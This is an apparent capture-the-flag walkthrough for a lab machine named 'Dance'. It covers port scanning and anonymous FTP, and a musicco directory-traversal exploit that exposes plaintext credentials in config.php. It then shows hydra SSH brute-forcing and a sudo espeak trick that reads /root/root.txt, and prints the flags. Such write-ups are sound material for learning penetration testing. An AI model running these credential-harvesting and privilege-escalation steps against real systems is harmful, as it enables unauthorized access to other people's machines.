***Remote Target: `10.0.0.11`***  
***Local Machine: `10.0.0.27`***

# 1. Enumeration

    root@kali ~/D/M/Dance# nmap -sS -p- -A -T4 10.0.0.11

    21/tcp open  ftp     vsftpd 3.0.3
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.0.0.27
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 4
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 ff:f8:ef:1f:1b:a1:40:87:34:0c:3d:35:c7:29:b1:3d (RSA)
    |   256 08:f5:fd:33:51:89:82:29:74:2d:44:c8:54:e7:f1:16 (ECDSA)
    |_  256 53:c2:f0:6f:5d:2c:a1:da:7c:ad:c8:24:fd:85:d2:29 (ED25519)
    80/tcp open  http    nginx 1.18.0
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: nginx/1.18.0

After scanning the machine for open ports, we found that 3.  
Let's start by logging to FTP as the "***anonymous***" user without a password.

    root@kali ~/D/M/Dance [1]# ftp anonymous@10.0.0.11                                                         
    Connected to 10.0.0.11.                                                                                    
    220 (vsFTPd 3.0.3)
    331 Please specify the password.
    Password: 
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> 

There were not files to see as the "***anonymous***" user. Let's continue to HTTP.

    root@kali ~/D/M/Dance# gobuster dir -u http://10.0.0.11/ -w /usr/share/wordlists/dirb/common.txt           

    /index.html           (Status: 200) [Size: 121]
    /music                (Status: 301) [Size: 169] [--> http://10.0.0.11/music/]

Going to the "***/music***" directory, we can see it is running "***musicco***". Searching "***musicco***" for exploits and we find a [***directory traversal exploit***][1].

Following the instructions on the command, we are to download the contents of the music directory on the remote server.

    root@kali ~/D/M/Dance# unzip Efe.zip
    root@kali ~/D/M/Dance# ls -l music                                                                         
    total 320                                                                                                  
    drwxr-xr-x  2 root root   4096 Oct  7 10:05 app
    -rw-r--r--  1 root root    572 Sep  7  2021 config.php
    drwxr-xr-x  6 root root   4096 Oct  7 10:05 doc
    -rw-r--r--  1 root root   7406 Oct 28  2018 favicon.ico
    -rw-r--r--  1 root root 191644 Oct 28  2018 index.php
    drwxr-xr-x 14 root root   4096 Oct  7 10:05 lib
    -rw-r--r--  1 root root    872 Oct 28  2018 manifest.json
    drwxr-xr-x  2 root root   4096 Oct  7 10:05 music
    -rw-r--r--  1 root root   4466 Oct 28  2018 musicco.js
    -rw-r--r--  1 root root  73728 Oct  7 09:51 music.db
    -rw-r--r--  1 root root    158 Oct 28  2018 offline.html
    -rw-r--r--  1 root root   5320 Oct 28  2018 README.md
    drwxr-xr-x  2 root root   4096 Oct  7 10:05 temp
    drwxr-xr-x  3 root root   4096 Oct  7 10:05 theme

Let's see if the "***config.php***" file has any credentials we can use.

    root@kali ~/D/M/Dance# cat music/config.php                                                                
    <?php                                                                                                      
    $_CONFIG['saveConfig'] = '';
    $_CONFIG['users'] = array(
            array('admin', 'admin', 'true'),
            array('guest', 'guest', 'false'),
            array('aria', 'seraphim', 'false'),
            array('alice', 'rememberyou', 'false'),
            array('ava', 'password', 'false'),
            array('alba', 'thehostof', 'false'),
    );
    $_CONFIG['lang'] = 'en';
    $_CONFIG['musicRoot'] = 'music';
    $_CONFIG['coverFileName'] = 'folder';
    $_CONFIG['coverExtension'] = '.png';
    $_CONFIG['loadLyricsFromFile'] = 'on';
    $_CONFIG['downLoadMissingCovers'] = 'on';
    $_CONFIG['searchEngine'] = '';
    $_CONFIG['imageSearchEngine'] = '';
    ?>

# 2. Exploitation

By separating the the usernames and password we found on the config file we can try to brute force the login for the SSH service.

    root@kali ~/D/M/Dance# hydra -L usernames.txt -P password.txt ssh://10.0.0.11 -IV -t4
    [22][ssh] host: 10.0.0.11   login: aria   password: seraphim
    [22][ssh] host: 10.0.0.11   login: alba   password: thehostof

>

    root@kali ~/D/M/Dance# ssh alba@10.0.0.11                                                                  
    alba@10.0.0.11's password:                                                                                 
    Linux dance 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64

    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Fri Oct  7 10:09:43 2022 from 10.0.0.27
    This account is currently not available.
    Connection to 10.0.0.11 closed.

We are not able to login as the user "***alba***" so let's try the user aria.

    root@kali ~/D/M/Dance [1]# ssh aria@10.0.0.11                                                              
    aria@10.0.0.11's password:                                                                                 
    Linux dance 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64                                     
                                                                                                            
    The programs included with the Debian GNU/Linux system are free software;                                  
    the exact distribution terms for each program are described in the                                         
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Fri Oct  7 10:10:18 2022 from 10.0.0.27
    aria@dance:~$ id -a
    uid=1000(aria) gid=1000(aria) groups=1000(aria),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

    aria@dance:~$ cat user.txt
    godisadj
    aria@dance:~$ su -s /bin/bash alba
    Password: 
    alba@dance:~$ id -a
    uid=1001(alba) gid=1001(alba) groups=1001(alba)

Let's see what sudo permissions the user "***alba***" has.

    alba@dance:~$ sudo -ll
    Matching Defaults entries for alba on dance:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User alba may run the following commands on dance:

    Sudoers entry:
        RunAsUsers: root
        Options: !authenticate
        Commands:
            /usr/bin/espeak

<!--Didn't work!-->
Searching for "***espeak***" exploits, I found a this [***CVE***][2] that led to this [***github page***][3] that showed that passing env variables to the command can lead to arbitrary command execution. Which means we can exploit this to read the final flag on the "***/root***" directory.

<!--Different solution!--->
    alba@dance:~$ sudo -u root /usr/bin/espeak -f /root/root.txt -q -X
    deadcandance

[1]: "https://www.exploit-db.com/exploits/45830"
[2]: "https://www.cvedetails.com/cve/CVE-2016-10193/"
[3]: "https://github.com/dejan/espeak-ruby/issues/7"